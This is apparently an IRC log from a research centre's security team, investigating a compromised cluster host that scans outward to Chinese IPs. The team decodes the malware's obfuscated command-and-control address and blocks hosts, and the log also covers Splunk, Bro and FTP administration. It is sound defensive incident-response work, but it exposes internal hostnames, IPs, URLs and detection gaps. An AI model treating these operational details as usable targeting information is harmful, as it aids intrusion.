2014-12-03 08:07:01	eyrich	141.142.226.150
2014-12-03 08:07:52	eyrich	lots of netflow to china IPs
2014-12-03 08:08:14	eyrich	or at least one
2014-12-03 08:21:01	jazoff	the 122.226.161.101 ?
2014-12-03 08:21:17	eyrich	yes
2014-12-03 08:21:22	eyrich	i think 
2014-12-03 08:21:37	eyrich	working on something else at the moment
2014-12-03 08:23:34	jazoff	ran a tcpdump to confirm
2014-12-03 08:24:21	jazoff	08:24:17.212692 IP 141.142.226.150.55458 > 122.226.161.101.7000: Flags [S], seq 45459:46483, win 6000, length 1024
2014-12-03 08:24:24	jazoff	08:24:17.212736 IP 141.142.226.150.55458 > 122.226.161.101.7000: Flags [S], seq 45459:46483, win 6000, length 1024
2014-12-03 08:24:27	jazoff	08:24:17.215728 IP 141.142.226.150.55458 > 122.226.161.101.7000: Flags [S], seq 45459:46483, win 6000, length 1024
2014-12-03 08:24:34	jazoff	lots of crap like that
2014-12-03 08:24:47	eyrich	i think we BHR it and get a copy of the VM
2014-12-03 08:24:57	jazoff	oh, it's doing other hosts too
2014-12-03 08:25:20	jazoff	yeah, bhr it
2014-12-03 08:27:04	eyrich	not sure the BHR interface is working
2014-12-03 08:27:14	eyrich	didnt kollross say he was screwing with it
2014-12-03 08:27:22	jazoff	not that i saw
2014-12-03 08:27:32	jazoff	lemme try over ssh
2014-12-03 08:27:32	eyrich	ya - something about chaning email addresses
2014-12-03 08:27:40	jazoff	oh, that
2014-12-03 08:27:52	eyrich	bhlist hasnt been generated since Created Mon Dec 1 16:00:26 2014
2014-12-03 08:28:16	eyrich	no bhr status emails latley either
2014-12-03 08:28:23	eyrich	can you investigate?
2014-12-03 08:28:26	jazoff	yes
2014-12-03 08:28:31	eyrich	I will be happy when we are running the new system
2014-12-03 08:28:51	jazoff	ah, postgres down?
2014-12-03 08:29:00	jazoff	OOM again
2014-12-03 08:29:14	jazoff	vmtoolsd using all the ram again
2014-12-03 08:29:38	eyrich	i think we will run the new bhr system on out stuff and monitor it.
2014-12-03 08:29:42	eyrich	our/out
2014-12-03 08:29:55	jazoff	blocked
2014-12-03 08:30:00	eyrich	cool
2014-12-03 08:32:48	jazoff	ah, nagios did alert that the BHR queue on supercell was growing
2014-12-03 08:37:32	jazoff	well, it's going to work through the backlog and block about 15k hosts
2014-12-03 08:37:36	jazoff	for a few minutes :)
2014-12-03 08:46:52	eyrich	splunk question
2014-12-03 08:47:11	eyrich	I need to do a search that uses a list of CIDRs that are available via a URL
2014-12-03 08:47:40	eyrich	is thta possible or do I need to save the list to splunk somehow
2014-12-03 08:48:09	eyrich	the URL data is unformatted text
2014-12-03 08:50:01	jazoff	how many urls, and is this something you want to do more than once, or just a one off thing?
2014-12-03 08:50:05	jazoff	er, cidrs
2014-12-03 08:50:43	eyrich	https://www.cloudflare.com/ips-v4
2014-12-03 08:52:22	jazoff	does thsi help:
2014-12-03 08:52:23	jazoff	ip=199.27.128.0/21 OR ip=173.245.48.0/20 OR ip=103.21.244.0/22 OR ip=103.22.200.0/22 OR ip=103.31.4.0/22 OR ip=141.101.64.0/18 OR ip=108.162.192.0/18 OR ip=190.93.240.0/20 OR ip=188.114.96.0/20 OR ip=197.234.240.0/22 OR ip=198.41.128.0/17 OR ip=162.158.0.0/15 OR ip=104.16.0.0/12'
2014-12-03 08:52:42	eyrich	ya I knew I could do that.
2014-12-03 08:53:00	jazoff	for a one off thing that is probably the easiest way
2014-12-03 08:55:50	jazoff	i'm not sure if csv lookups can match cidr blocks
2014-12-03 10:10:34	wardog	cyclone has exceeded license.
2014-12-03 10:10:57	wardog	And right now, it's about to hit the daily limit
2014-12-03 10:11:06	jazoff	hmm
2014-12-03 10:11:09	wardog	in what looks like under an hour
2014-12-03 10:11:37	wardog	bro weird is skyrocketing
2014-12-03 10:11:41	jazoff	yeah
2014-12-03 10:11:46	wardog	no wait.
2014-12-03 10:11:48	wardog	syslog
2014-12-03 10:12:03	wardog	no, weird
2014-12-03 10:12:11	jazoff	weird, yes
2014-12-03 10:12:18	jazoff	looks like whatever it was stopped
2014-12-03 10:12:20	wardog	ooh. looks like it's normalized
2014-12-03 10:12:22	wardog	yeah
2014-12-03 10:12:31	jazoff	194M    2014-12-03/weird.06:00:02-07:00:00.log.gz
2014-12-03 10:12:32	jazoff	203M    2014-12-03/weird.07:00:00-08:01:38.log.gz
2014-12-03 10:12:32	jazoff	51M     2014-12-03/weird.08:01:38-09:00:00.log.gz
2014-12-03 10:12:32	jazoff	4.7M    2014-12-03/weird.09:00:00-10:00:00.log.gz
2014-12-03 10:12:51	jazoff	ah, it was 141.142.226.150 after we blocekd it
2014-12-03 10:13:50	wardog	data_before_established
2014-12-03 10:14:10	wardog	jeeebus
2014-12-03 10:14:39	wardog	yep
2014-12-03 10:18:40	jazoff	ah, did anyone email leo?
2014-12-03 10:19:56	wardog	not yet. I'm going to as soon as I get the right contacts.
2014-12-03 11:32:14	soehlert	jazoff: why don't you just switch who the topN goes out to? is that in your script? or is it using aliases
2014-12-03 11:41:49	jazoff	I suppose :)
2014-12-03 11:41:53	jazoff	but I figured i'm missing other email too
2014-12-03 11:48:36	wardog	when did netflow stats fall off?
2014-12-03 11:49:34	jazoff	netflow stats?
2014-12-03 11:54:28	soehlert	meh the other admin stuff i doubt you need. this one isn't really admin related anyways.
2014-12-03 11:55:25	jazoff	ah, where should I send it then?
2014-12-03 12:00:16	soehlert	probably security-alerts. 
2014-12-03 12:00:18	jazoff	looks like the old one used to go to security-alerts+topn@ncsa.illinois.edu
2014-12-03 12:00:24	jazoff	should I use that?
2014-12-03 12:00:31	soehlert	sure
2014-12-03 12:00:35	jazoff	i forget why I changed it in the first place
2014-12-03 12:00:35	soehlert	provided that still works
2014-12-03 12:00:43	soehlert	you probably didnt realize you were changing it
2014-12-03 12:01:54	jazoff	no.. i did it on purpose and the commit message was 'change top talker email'
2014-12-03 12:02:12	jazoff	but I guess it was changed to security admin instead of alerts
2014-12-03 12:03:30	soehlert	huh..weird
2014-12-03 12:06:26	wardog	which one is our nmap scanning system?
2014-12-03 12:08:41	jazoff	tornado
2014-12-03 12:22:48	wardog	well, 141.142.226.150 was accessed on Nov 23rd at 4:26am from 222.161.4.161.
2014-12-03 12:23:16	wardog	ooh, that's not a nice host.
2014-12-03 12:23:31	jazoff	nope
2014-12-03 12:26:08	jazoff	we did auto block it at least, just not for very long
2014-12-03 12:27:20	wardog	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20sourcetype%3Dbro_ssh%20222.161.4.161%20status!%3Dfailure&earliest=-30d%40d&latest=now
2014-12-03 12:30:05	jazoff	yeah, undetermined
2014-12-03 12:30:46	jazoff	likely failures
2014-12-03 12:30:53	jazoff	at least, if one succeeded they wouldn't try again
2014-12-03 12:32:27	jazoff	looks like it got nullrouted pretty quickly
2014-12-03 12:34:17	wardog	all other ssh activity around this period were marked in bro as 'failure' for .150. This is the only one that pops up as undetermined.
2014-12-03 12:34:52	jazoff	based on their being 2000 of them they are likely failures
2014-12-03 12:35:06	jazoff	if you had 2000 failures and then 1 undetermined that would be worrysome
2014-12-03 12:35:21	jazoff	though i'm not sure why there are so many if it got bhrd
2014-12-03 12:36:29	jazoff	ah, i was looking at the timeline wrong
2014-12-03 12:36:39	jazoff	the 2000 attempts were logged within ~30 seconds
2014-12-03 12:39:13	wardog	yeah, looks like it's split between failure and undetermined.
2014-12-03 12:39:48	wardog	for the cn host.
2014-12-03 12:42:02	jazoff	hmm
2014-12-03 12:42:18	wardog	only tcp 22 open on that host. It's ubuntu
2014-12-03 12:43:16	jazoff	yeah, i don't see much in the raw con logs
2014-12-03 12:43:32	jazoff	the durations increase, but that looks to be caused by it getting bhrd
2014-12-03 12:43:37	wardog	nfsen for that whole hour, the traffic was pretty small.
2014-12-03 12:43:46	jazoff	so rather than the ssh connection close after a second or two it times out after a few minutes
2014-12-03 12:45:32	jazoff	no outbound http either from that host
2014-12-03 13:21:52	wardog	so, how was this not detected? 2014-11-22 09:50:12.355  1420.074 TCP    141.142.226.150:32838 ->    115.238.184.2:8888  ....S.   0        8     8512        0       47   1064
2014-12-03 13:22:25	wardog	It started syn scanning on the 22nd outbound.
2014-12-03 13:22:36	jazoff	hmm
2014-12-03 13:23:07	jazoff	the outbound scan you mean?
2014-12-03 13:23:34	wardog	yeah
2014-12-03 13:24:01	jazoff	i'm not sure if there are any policies that would flag that kind of traffic
2014-12-03 13:24:06	jazoff	other than the topN report
2014-12-03 13:25:19	wardog	ok.......
2014-12-03 13:25:21	soehlert	isnt outbound scanning detection possible in bro? i thought it just needed to be turned on
2014-12-03 13:25:30	wardog	From the 22nd 2     141.142.226.148  2325869  13959976    1.36     3     104   2695      leovip148.ncsa.uiuc.edu             Unknown
2014-12-03 13:25:34	wardog	stupid copy
2014-12-03 13:25:43	wardog	oh, no that's right
2014-12-03 13:25:50	wardog	That's a DIFFERENT leo system.
2014-12-03 13:26:16	jazoff	oh, actually i think it will detect it
2014-12-03 13:26:48	wardog	You guys alright with skipping whiparound, or meeting without me. I want to keep digging into this.
2014-12-03 13:27:00	soehlert	fine with me.
2014-12-03 13:30:07	wardog	I'm not seeing successful inbound ssh to that host. My guess, it's jumping from another leo host.
2014-12-03 13:30:16	wardog	any idea what the leo block is?
2014-12-03 13:32:36	jazoff	that whole subnet
2014-12-03 13:33:01	jazoff	all resolves to leo
2014-12-03 13:33:04	soehlert	we have some stuff on the 226
2014-12-03 13:33:09	wardog	 /24?
2014-12-03 13:33:14	soehlert	at least dew is im pretty sure. or maybe that's 236...
2014-12-03 13:33:31	soehlert	nvm thats 236
2014-12-03 13:35:22	wardog	yep. /24
2014-12-03 13:37:05	wardog	shouldn't this work? id_dest_h=141.142.226.0/24
2014-12-03 13:38:11	jazoff	id_resp_h
2014-12-03 13:38:22	wardog	sigh
2014-12-03 13:39:48	wardog	how do I search just the gulp stuff? index=gulp?
2014-12-03 13:40:09	wardog	got it
2014-12-03 13:49:08	jschipp	cif
2014-12-03 13:51:24	wardog	ssh to a leo host from 129.114.62.14. questionable....
2014-12-03 13:59:19	jazoff	wardog: the ssh compromise that ian-OU was talking about...
2014-12-03 13:59:34	jazoff	"Tacc Austin detected this through ssh command auditing"
2014-12-03 14:04:52	wardog	yeah
2014-12-03 14:04:55	wardog	they didn't notice until Saturday
2014-12-03 14:05:18	wardog	what about it?
2014-12-03 14:05:34	wardog	Oh that ssh is from early november
2014-12-03 14:06:02	jazoff	oh
2014-12-03 14:06:23	wardog	according to gulp we have a few people who connect from there.
2014-12-03 14:06:35	wardog	just a few.
2014-12-03 14:10:53	wardog	141.142.226.182 looks like our patient zero
2014-12-03 14:16:36	soehlert	sigh. i wonder what they were exfiling
2014-12-03 14:45:28	wardog	so jazoff, what's the concensus on outbound scan detection?
2014-12-03 14:46:01	jazoff	based on the policy it doesnt seem to care
2014-12-03 14:46:30	wardog	Are we just BHRing inbound but not notifying?
2014-12-03 14:46:41	jazoff	correct
2014-12-03 14:46:44	wardog	Can we endable notification on just outbound?
2014-12-03 14:46:45	jazoff	that would be a lot of noticies
2014-12-03 14:46:55	jazoff	yeah, i'm checking notice.log to see if any even fired
2014-12-03 14:48:45	jazoff	2014-12-02T11:26:30-0600        141.142.226.150 Scan::Address_Scan      141.142.226.150 scanned at least 37 unique hosts on port 7300/tcp in 0m0s       loca
2014-12-03 14:49:11	jazoff	lots of false positives though
2014-12-03 14:49:20	jazoff	2014-12-01T12:50:37-0600        141.142.43.69   Scan::Address_Scan      141.142.43.69 scanned at least 37 unique hosts on port 80/tcp in 4m23s  local
2014-12-03 14:49:39	jazoff	but I can enable the notices and we can build up a whitelist
2014-12-03 14:52:49	jschipp	test
2014-12-03 14:52:50	jschipp	test
2014-12-03 14:54:32	wardog	didn't this pop up? 141.142.226.245
2014-12-03 14:54:40	wardog	a month ago or so?
2014-12-03 14:58:39	jazoff	not in oct..
2014-12-03 14:58:44	jazoff	nov though
2014-12-03 14:58:59	wardog	i mean, in an open investigation.
2014-12-03 14:59:05	wardog	Doesn't look like it though
2014-12-03 14:59:18	jazoff	2014-11-05T13:15:54-0600        Scan::Address_Scan      141.142.226.245 scanned at least 37 unique hosts on port 80/tcp in 0m30s        local
2014-12-03 14:59:31	jazoff	but that could be a FP
2014-12-03 14:59:41	jazoff	i bet something like yum could even trigger that
2014-12-03 15:01:29	wardog	arg. having con in splunk would really help right now.
2014-12-03 15:02:01	jazoff	zfgrep on lowp is it for now
2014-12-03 15:04:14	jazoff	ok, udpated notice policy heading to bro-dev
2014-12-03 15:06:41	jazoff	ok, dog food time :)
2014-12-03 15:50:08	jazoff	I did come across http://www.splunk.com/view/hunk/SP-CAAAH2E when I was reading the splunk docs
2014-12-03 15:50:20	jazoff	could use that to analyze raw bro logs if a gateway was written
2014-12-03 15:50:29	jazoff	though I _think_ you can do something like that with regular splunk
2014-12-03 15:50:39	jazoff	since you can write a search command that generates data, like...
2014-12-03 15:51:05	jazoff	| bro_archive -d 2014-11-23 -f 141.142.226.245
2014-12-03 15:51:12	jazoff	and have it grep the logs from that day for 141.142.226.245
2014-12-03 15:52:53	jazoff	yeah, it would work like their db stuff... http://docs.splunk.com/Documentation/DBX/latest/DeployDBX/Commands
2014-12-03 16:05:40	jazoff	I think I could put something together that like pretty easily
2014-12-03 16:14:18	jazoff	and apparently I already did.. 2 years ago https://github.com/JustinAzoff/bro-http-rest/blob/master/bro_http_rest.py
2014-12-03 17:17:33	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has left #security
2014-12-03 17:19:34	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-12-03 17:21:13	jschipp	cif is getting there
2014-12-04 09:00:08	wardog	Not sure when it popped up but BWAM-3020 might be waiting for action.
2014-12-04 09:01:30	wardog	anyone here with a good grasp of assembly?
2014-12-04 09:06:13	jazoff	i did mips assembly in college :)
2014-12-04 09:06:22	jazoff	11 years ago :)
2014-12-04 09:18:39	wardog	well, see if this makes any sense. https://uofi.app.box.com/s/92d3u8rb46qh6crtixym
2014-12-04 09:19:08	wardog	it decodes the encrypted IP address and port for the CNC for this malware downloaded to the leo machine
2014-12-04 09:19:46	wardog	the two calls provided the following arguments. 313-277-61/1 and 2/:83
2014-12-04 09:24:31	jazoff	ah, no way :)
2014-12-04 09:24:40	wardog	bummer.
2014-12-04 09:25:26	jazoff	i kinda can read stuff like that, but dont know x86 asm
2014-12-04 09:26:04	jazoff	though this was on HN recently  http://hackeradam17.com/2014/03/18/an-introduction-to-x86_64-assembly-language/
2014-12-04 09:28:17	jazoff	it's probably a pretty simple loop in C too
2014-12-04 09:29:13	jazoff	looks like there is really only one branch (at the bottom)
2014-12-04 09:29:58	jazoff	which appears to either inc or dec one of the items
2014-12-04 09:32:42	jazoff	if it was 313-277-61-1 i'd think it could be just like rot13
2014-12-04 09:34:04	jazoff	though, can you search netflow dump for an ip matching ###.###.##.# ?
2014-12-04 09:39:17	jazoff	if you remind me what the ip/timeframe is I can do it :)
2014-12-04 09:39:53	wardog	november 22ish to the 24th
2014-12-04 09:40:01	wardog	from 141.142.226.150
2014-12-04 09:43:48	jazoff	and i bet it's a 4 digit port too
2014-12-04 09:55:18	jazoff	ok, grepping
2014-12-04 09:57:32	jazoff	i mean, based on that code, it's just flipping some bits
2014-12-04 09:57:50	jazoff	and if it's this size: 313-277-61/1 i dont think there are many choices
2014-12-04 09:58:12	jazoff	and the fact that the - and / show up where dots should be
2014-12-04 09:58:15	jazoff	oh! and in ascii..
2014-12-04 09:58:53	soehlert	WFH today
2014-12-04 09:58:59	jazoff	>>> [ord(x) for x in ".-/"]
2014-12-04 09:59:00	jazoff	[46, 45, 47]
2014-12-04 09:59:08	jazoff	so that fits with what I thought the asm did..
2014-12-04 09:59:17	jazoff	looks like it might alternate incrimenting or decrimenting ips
2014-12-04 09:59:21	jazoff	er, chars
2014-12-04 10:01:18	jazoff	>>> s="313-277-61/1"
2014-12-04 10:01:19	jazoff	>>> changes = itertools.cycle([-1, +1])
2014-12-04 10:01:19	jazoff	>>> print ''.join(chr(ord(x) + changes.next()) for x in s)
2014-12-04 10:01:19	jazoff	222.186.52.2
2014-12-04 10:01:29	jazoff	traffic to 222.186.52.2
2014-12-04 10:01:39	ncsabot	Seen in 39 hours over 12 days. First seen in 2014-02-17.db. Last seen in 2014-12-03.db
2014-12-04 10:02:08	jazoff	i bet that's it
2014-12-04 10:02:32	wardog	and 10992 is the port
2014-12-04 10:04:11	jazoff	1416661026.295228	CUBycD3rTcOtxH0kM8	222.186.52.2	10992	141.142.226.150	45170	tcp	-	4.047051	1	0	OTH	F	0	D	10	410	0	0	(empty)	CN	US	nids-27-4
2014-12-04 10:04:14	jazoff	1416661116.798178	CDMZWy2WlTvdWCmSW4	141.142.226.150	45174	222.186.52.2	10992	tcp	-	3116.864582	47867	7032	RSTO	T	27	ShDadARR	5903	451991	6880	373320	(empty)	US	CN	nids-27-1
2014-12-04 10:04:18	jazoff	1416664248.649108	CgUPnWoVXWtzpaK5b	222.186.52.2	10992	141.142.226.150	45174	tcp	-	45.061061	1	0	OTH	F	0	D	8	328	0	0	(empty)	CN	US	nids-27-1
2014-12-04 10:04:21	jazoff	bleh
2014-12-04 10:04:26	wardog	yummy
2014-12-04 10:05:33	jazoff	but yeah, matching connections
2014-12-04 10:05:41	jazoff	2014-11-22T06:09:45-0600 141.142.226.150 45169 222.186.52.2 10992 89.760862
2014-12-04 10:05:41	jazoff	2014-11-22T06:11:16-0600 141.142.226.150 45170 222.186.52.2 10992 2729.019889
2014-12-04 10:05:41	jazoff	2014-11-22T06:57:00-0600 141.142.226.150 45173 222.186.52.2 10992 82.194816
2014-12-04 10:05:44	jazoff	last col is duration
2014-12-04 10:06:02	jazoff	should I BHR 222.186.52.2 ?
2014-12-04 10:13:33	wardog	yes
2014-12-04 10:15:32	wardog	ok, this was a different version
2014-12-04 10:15:33	wardog	32/143/32-315
2014-12-04 10:15:44	wardog	same port
2014-12-04 10:18:43	jazoff	23.234.41.224
2014-12-04 10:20:50	wardog	2014-11-22T06:06:45.766265CCH4QH3hs9ZP05F27141.142.226.1503299223.234.41.22465534tcphttp14.1305061221513790SFT21761ShADadFf10044044420903111204(empty)USUSnids-25-5
2014-12-04 10:20:53	wardog	that's nice
2014-12-04 10:21:21	wardog	anywhoo... I do see traffic on port 10992 in flows for that IP too
2014-12-04 10:21:28	jazoff	yeah.. I started re-writing that bro log gateway program in go last night
2014-12-04 10:22:23	jazoff	so once I work out some issues and write the http api you'll be able to do that kind of grep in splunk
2014-12-04 10:22:40	jazoff	should be able to also integrate it with netflow indexer
2014-12-04 10:22:52	wardog	nice
2014-12-04 10:25:50	wardog	spot check suggests .150 is the only host
2014-12-04 10:28:06	wardog	weird. looking at nfsen for the last month, there was a sudden drop off of traffic on the 30th
2014-12-04 10:33:54	jazoff	probably project related
2014-12-04 10:34:04	jazoff	big transfer finished and their done for a while
2014-12-04 10:34:17	jazoff	i've seen things like 3 day gridftp transfers
2014-12-04 10:34:56	wardog	looks like its been high for about a month and a half, then drops on the 30th
2014-12-04 10:35:23	wardog	and, it's not icmp/udp/tcp
2014-12-04 10:37:54	jazoff	not sure what you are looking at...
2014-12-04 10:38:02	jazoff	can you hit bookmark url and psate the link
2014-12-04 10:38:09	wardog	nfsenhttp://flows-sec.internal.ncsa.edu/nfsen/index.php?bookmark=MnwwfC4vbGl2ZXxuZXRkYXRhfG90aGVyfGZsb3dzfDd8MHwxNDE3NzEwMzAwfDE0MTczMzg2MDB8MTQxNzMzODYwMHwwfDF8MA%3D%3D
2014-12-04 10:38:23	wardog	then bring the display down to about a week.
2014-12-04 10:38:31	jazoff	ah, flows
2014-12-04 10:38:34	jazoff	i was looking at traffic
2014-12-04 10:38:46	wardog	http://flows-sec.internal.ncsa.edu/nfsen/index.php?bookmark=MnwwfC4vbGl2ZXxuZXRkYXRhfG90aGVyfGZsb3dzfDR8MHwxNDE3NzEwMzAwfDE0MTczMzg2MDB8MTQxNzMzODYwMHwwfDF8MA%3D%3D
2014-12-04 10:39:15	jazoff	oh, for proto 'other'
2014-12-04 10:39:26	jazoff	that's usually something like ipsec (ESP) right?
2014-12-04 10:39:27	wardog	'any'
2014-12-04 10:39:39	jazoff	no you're on other
2014-12-04 10:40:01	wardog	oh, you're right
2014-12-04 10:40:33	jazoff	and i think the little m is something like milli not million
2014-12-04 10:40:52	jazoff	i think that might be literally 180 flows
2014-12-04 10:41:21	jazoff	oh actually, no, that would be 180. '180 m' i think is .18
2014-12-04 10:41:28	jazoff	nfsen is weird like that
2014-12-04 10:42:39	wardog	looks like multicast
2014-12-04 11:06:30	wardog	still not seeing an inbound ssh connection to the leo cluster that could suggest a local jumphost within the leo systems...
2014-12-04 11:06:39	wardog	may need to expand my net
2014-12-04 12:47:00	soehlert	did anyone see this? https://gist.github.com/sethhall/e7902090fe383578917d
2014-12-04 12:49:42	jazoff	ha
2014-12-04 12:59:47	jazoff	eyrich: is teh BHR meeting canceled?
2014-12-04 13:00:04	eyrich	yes
2014-12-04 13:01:33	jazoff	ok :) last time it showed up as canceled but apparently wasnt :)
2014-12-04 13:16:15	wardog	justin, I want that bro script running by the end of the day.
2014-12-04 13:16:37	jazoff	to get logs in splunk?
2014-12-04 13:16:43	jazoff	oh, seths?
2014-12-04 13:16:43	jazoff	lol
2014-12-04 13:16:48	wardog	yeah
2014-12-04 13:16:55	jazoff	well, I just about have the splunk thing working
2014-12-04 13:16:59	wardog	I think there's a compromised rdp server on the leo net.
2014-12-04 13:17:08	jazoff	ahh, rdp
2014-12-04 13:17:24	jazoff	there's a bro rdp analyzer that someone is working on
2014-12-04 13:19:27	eyrich	that willl be nice since we got denied on rdp blocking at the border
2014-12-04 13:50:04	eyrich	jazoff: when do you think we can start building out the new BHR system at NCSA?
2014-12-04 13:50:45	eyrich	I talked with NetEng they are on board with us hosting/managing all the boxes
2014-12-04 13:50:52	jazoff	how about next week when i'm in the office?
2014-12-04 13:52:30	eyrich	sounds good
2014-12-04 13:53:06	wardog	Can't tellw hat I'm looking at. nfsen suggests a full session. bro says teh same connections are RST[OR]
2014-12-04 13:53:31	jazoff	what does bro show for the *_ip_bytes fields?
2014-12-04 13:54:21	wardog	crap, didn't pull the headers with the logs
2014-12-04 13:54:29	wardog	which field?
2014-12-04 13:54:30	wardog	:D
2014-12-04 13:56:25	jazoff	you'll have to zless one to line it up
2014-12-04 13:56:32	jazoff	also.. i got that gateway thing mostly working
2014-12-04 13:56:43	jazoff	if you put into splunk
2014-12-04 13:56:45	jazoff	| brologs prefix=conn startdate=2014-11-22 enddate=2014-11-23 filter=222.186.52.2 | table *
2014-12-04 13:56:46	wardog	looks like it's got numbers there. 6160 is one example.
2014-12-04 13:57:09	jazoff	it will eventually give you the 6 lines from the log
2014-12-04 13:57:19	jazoff	it's kinda slow though...
2014-12-04 13:57:47	jazoff	using gzcat instead of the native go gzip reader is much faster, but I have a bug when I use it that I dont know hwo to fix
2014-12-04 14:02:54	jazoff	looks like the splunk generation command helper thing buffers the command output.. that won't work
2014-12-04 14:29:33	wardog	what's the hostname for the netdot server?
2014-12-04 14:29:56	jazoff	isn't it netdot?
2014-12-04 14:30:03	jazoff	yes, netdot.ncsa...
2014-12-04 14:42:37	wardog	which password is it supposed to use?
2014-12-04 14:46:33	jazoff	kerberos
2014-12-04 14:50:58	wardog	weird. I'm getting a certificate warning for the site from chrome on mac, but not from chrome on windows.
2014-12-04 14:51:17	wardog	yeah, it doesn't like my username/pw
2014-12-04 14:52:43	soehlert	jazoff: can you use require => Class['epel'] in puppet? or only packages, files, etc..
2014-12-04 14:53:09	jazoff	i think you can
2014-12-04 14:54:06	soehlert	ok cool...package wont install without epel
2014-12-04 14:54:33	jazoff	i think if you just do
2014-12-04 14:54:35	jazoff	include epel
2014-12-04 14:54:37	jazoff	it will do the right thing
2014-12-04 14:55:05	jazoff	but maybe i just think that works when it really just takes 2 runs to work
2014-12-04 14:55:28	jazoff	include epel and then require Class[ couldnt hurt though
2014-12-04 14:55:43	jazoff	http://ryandlane.com/blog/2014/08/04/moving-away-from-puppet-saltstack-or-ansible/ is an intersting post :)
2014-12-04 14:55:45	soehlert	ya it takes two runs that way
2014-12-04 14:55:55	soehlert	dont even joke about that URI
2014-12-04 14:56:00	jazoff	:)
2014-12-04 14:56:04	soehlert	i'll read it though
2014-12-04 15:07:57	soehlert	gotta run to the vet. be back in a bit
2014-12-04 15:50:33	wardog	https://bhr.ncsa.illinois.edu/bhwebsimple.html right?
2014-12-04 15:52:43	soehlert	if you go to the portal it has the right link
2014-12-04 16:29:28	soehlert	for this bw-outbox, what permissions do you think i need on the shared dir they dump into? i have anonymous ftp set up and /home/ftp is where it all goes. but then i need everyone to have access when they come to the host to use the s3cmds. so 777 on ~ftp/ ?
2014-12-04 16:42:35	jazoff	ftp?
2014-12-04 16:43:41	jazoff	so the bro splunk thing actually kinda works
2014-12-04 16:44:07	jazoff	just need to figure out how to not buffer the results - i think i just need to output the raw results myself. i think the problem is their library wants to output a csv
2014-12-04 16:44:20	jazoff	and it cant do that until it has all the rows so it knows what columns it needs
2014-12-04 16:44:46	soehlert	ya its for the sonnexion core dumps. they dump them onto this box anonymous style (though ftp only listens on 10.5 and iptables backs up the binding)
2014-12-04 16:44:46	soehlert	then they got on this box and use s3cmd to get them to amazon which they apparently need..
2014-12-04 16:45:01	soehlert	makes sense on the knowing what columns are needed..
2014-12-04 16:45:30	jazoff	yeah, I think rather than output as json like results, I think I just need to give splunk _raw lines with key=value
2014-12-04 16:45:44	jazoff	i think that will be a lot slower, but it will handle larger results better
2014-12-04 16:45:52	soehlert	that should be easy enough to massage at least
2014-12-04 16:48:03	soehlert	so what do you think about the 777 perms?
2014-12-04 16:48:03	soehlert	workflow would basically be ftp from sonnexions, then go through bwbh* to get to bw-outbox (host based) and run s3cmd to upload file from /home/ftp/
2014-12-04 16:48:42	jazoff	ah
2014-12-04 16:49:06	jazoff	It's probably pretty easy to write a program that acts as an ftp server but proxies to s3
2014-12-04 16:50:35	jazoff	or actually, there's s3fs that uses fuse
2014-12-04 16:51:13	soehlert	just stop :)
2014-12-04 16:51:13	soehlert	we spent a long time trying to troubleshoot this shit already. ftp was agreed upon because s3cmd isnt from amazon and has weird (in)abilities
2014-12-04 16:51:33	soehlert	we may look into something else long term, but i need to get this running for now
2014-12-04 16:51:36	jazoff	sure :)
2014-12-04 16:51:46	jazoff	i've used s3cmd a lot.. never had problems with it
2014-12-04 16:51:59	soehlert	you cant proxy over https i believe was the big road block
2014-12-04 16:52:00	jazoff	though boto comes with a similar tool these days and amazon hired the boto guy
2014-12-04 16:52:19	soehlert	ya but the cray people are forced to use this from whoever owns the sonnexions
2014-12-04 16:52:19	soehlert	politics are in play here
2014-12-04 16:53:51	soehlert	sooooo 777 or am i overthinking this?
2014-12-04 16:54:01	jazoff	shouldn't need 777
2014-12-04 16:54:32	jazoff	though the perms on the dir wouldnt help much, you likely need to tweak the umask in the ftp config
2014-12-04 16:55:22	soehlert	well ~ftp is owned by the user ftp and they would be on that box as themselves. so how else will they get into the dir otherwise
2014-12-04 16:55:46	jazoff	ah
2014-12-04 16:56:23	jazoff	i guess that works
2014-12-04 16:56:28	jazoff	though you may still need to tweak the umask
2014-12-04 16:57:43	soehlert	Umask                       133:022?
2014-12-04 16:58:08	soehlert	i always get confused with damn umask stuff. but i was able to delete something just as soehlert and create something there so that should work? unless its too loose.
2014-12-04 16:58:35	jazoff	umask is just 777 - those perms
2014-12-04 16:58:41	jazoff	so 022 will give a file as 755
2014-12-04 16:58:51	jazoff	well, more i think that it will give a dir as 755 and a file as 644
2014-12-04 17:00:12	soehlert	so 133 would be 644 as dir
2014-12-04 17:00:14	soehlert	right?
2014-12-04 17:00:42	soehlert	since you subtract from 777
2014-12-04 17:00:53	jazoff	yeah
2014-12-04 17:00:55	soehlert	and for file it would be 644 also since you subtract from 666
2014-12-04 17:05:22	jazoff	i think so
2014-12-04 17:06:10	soehlert	so that needs to be looser no? 
2014-12-04 17:06:39	soehlert	acutally idk. does s3cmd need x or just r?
2014-12-04 17:06:43	jazoff	r
2014-12-04 17:06:47	soehlert	ah then that should work
2014-12-04 17:06:59	jazoff	and w on the parent directory should let them delete files
2014-12-04 17:08:17	soehlert	ok that makes sense. i think we're good then. 
2014-12-04 17:08:53	soehlert	any chance you can test out the s3cmd stuff for me?
2014-12-04 17:09:40	jazoff	you mean like with amazon creds?
2014-12-04 17:10:01	soehlert	sure idk how it works. never used it. just s3cmd upload a file or something from ~ftp to wherever you use it?
2014-12-04 17:10:12	soehlert	id prefer to test this stuff ourselves before handing if off as much as possible.
2014-12-04 17:10:33	jazoff	it's kind of a pain to generate new creds and all that..
2014-12-04 17:10:38	soehlert	ah ok nvm then
2014-12-04 17:10:42	jazoff	i'd just try running s3cmd with invalid creds..
2014-12-04 17:10:49	soehlert	what would the command be?
2014-12-04 17:10:51	jazoff	if you get far enough to get an invalid credentials error, they should be all set
2014-12-04 17:11:15	jazoff	just try a s3cmd ls
2014-12-04 17:11:21	soehlert	ok thanks
2014-12-04 17:11:26	jazoff	i think when you run it for the first time with no config it offers to set it up for you
2014-12-04 17:11:43	jazoff	if not, s3cmd --configure
2014-12-04 17:12:15	soehlert	ok this seems to work. ERROR: Test failed: 403 (InvalidAccessKeyId): The AWS Access Key Id you provided does not exist in our records.
2014-12-04 17:12:28	jazoff	you should be all set then
2014-12-04 17:12:32	jazoff	it's all over the same port
2014-12-04 17:13:31	soehlert	perfect. did you ever manage to get something whipped up in bro to look for outbound traffic to aws for this box?
2014-12-04 17:13:42	soehlert	or i guess all traffic that isnt yum updates or aws
